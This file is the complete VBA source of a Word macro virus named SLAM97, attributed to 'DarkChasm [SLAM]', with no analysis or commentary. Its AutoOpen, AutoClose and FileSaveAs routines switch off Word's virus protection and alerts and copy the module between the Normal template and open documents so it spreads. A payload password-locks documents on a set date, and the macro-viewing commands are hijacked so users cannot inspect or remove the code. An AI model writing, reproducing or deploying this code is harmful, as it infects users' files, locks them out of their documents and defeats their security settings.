   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "SLAM97"
   Sub AutoOpen()
   On Error GoTo SLAM97

       Application.ScreenUpdating = False
       Application.DisplayAlerts = wdAlertsNone

       WordBasic.DisableAutoMacros 0
       Options.VirusProtection = False

       Set GlobalDoc = NormalTemplate
       Set ActiveDoc = ActiveDocument

       GlobalInstalled = No
       DocumentInstalled = No

      For J = 1 To NormalTemplate.VBProject.VBComponents.Count
           If NormalTemplate.VBProject.VBComponents(J).Name = "SLAM97" Then
               GlobalInstalled = Yes
           End If
      Next

       For I = 1 To ActiveDocument.VBProject.VBComponents.Count
           If ActiveDocument.VBProject.VBComponents(I).Name = "SLAM97" Then
               DocumentInstalled = Yes
           End If
      Next

       If GlobalInstalled = No Then
           Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="SLAM97", Object:=wdOrganizerObjectProjectItems
           Options.SaveNormalPrompt = False
       End If

       If DocumentInstalled = No Then
           Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="SLAM97", Object:=wdOrganizerObjectProjectItems
           ActiveDoc.SaveAs FileName:=ActiveDoc.Name, FileFormat:=wdFormatTemplate
       End If

       Application.DisplayAlerts = wdAlertsAll

       Payload

   SLAM97:
   End Sub

   Sub AutoClose()
   On Error GoTo SLAM97

       Application.ScreenUpdating = False
       Application.DisplayAlerts = wdAlertsNone

       WordBasic.DisableAutoMacros 0
       Options.VirusProtection = False

       Set GlobalDoc = NormalTemplate
       Set ActiveDoc = ActiveDocument

       GlobalInstalled = No
       DocumentInstalled = No

       For J = 1 To NormalTemplate.VBProject.VBComponents.Count
           If NormalTemplate.VBProject.VBComponents(J).Name = "SLAM97" Then
               GlobalInstalled = Yes
           End If
       Next

       For I = 1 To ActiveDocument.VBProject.VBComponents.Count
           If ActiveDocument.VBProject.VBComponents(I).Name = "SLAM97" Then
               DocumentInstalled = Yes
           End If
       Next

       If GlobalInstalled = No Then
           Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="SLAM97", Object:=wdOrganizerObjectProjectItems
           Options.SaveNormalPrompt = False
       End If

       If DocumentInstalled = No Then
           Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="SLAM97", Object:=wdOrganizerObjectProjectItems
           ActiveDoc.SaveAs FileName:=ActiveDoc.Name, FileFormat:=wdFormatTemplate
       End If

       Payload

       Application.DisplayAlerts = wdAlertsAll

   SLAM97:
   End Sub

   Sub FileSaveAs()

       Dialogs(wdDialogFileSaveAs).Show

   On Error GoTo SLAM97

       Application.ScreenUpdating = False
       Application.DisplayAlerts = wdAlertsNone

       WordBasic.DisableAutoMacros 0
       Options.VirusProtection = False

       Set GlobalDoc = NormalTemplate
       Set ActiveDoc = ActiveDocument

       GlobalInstalled = No
       DocumentInstalled = No

       For J = 1 To NormalTemplate.VBProject.VBComponents.Count
           If NormalTemplate.VBProject.VBComponents(J).Name = "SLAM97" Then
               GlobalInstalled = Yes
           End If
       Next

       For I = 1 To ActiveDocument.VBProject.VBComponents.Count
           If ActiveDocument.VBProject.VBComponents(I).Name = "SLAM97" Then
               DocumentInstalled = Yes
           End If
       Next

       If GlobalInstalled = No Then
           Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="SLAM97", Object:=wdOrganizerObjectProjectItems
           Options.SaveNormalPrompt = False
       End If

       If DocumentInstalled = No Then
           Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="SLAM97", Object:=wdOrganizerObjectProjectItems
           ActiveDoc.SaveAs FileName:=ActiveDoc.Name, FileFormat:=wdFormatTemplate
       End If

       Application.DisplayAlerts = wdAlertsAll

   SLAM97:
   End Sub

   Sub Payload()
   On Error GoTo SLAM97
       If Month(Now()) = 1 And Day(Now()) = 1 And Year(Now()) = 1998 Then
           If ActiveDoc.HasPassword = False Then
               ActiveDoc.Password = "SLAM97"
           End If
       End If

       If Month(Now()) = 10 And Day(Now()) = 16 Then
         MsgBox "SLAM97, written by DarkChasm [SLAM]", vbOKOnly, "SLAM97"
       End If

   SLAM97:
   End Sub

   Sub ToolsMacro()
     Payload
   End Sub

   Sub FileTemplates()
     Payload
   End Sub

   Sub ViewVBCode()
     Payload
   End Sub
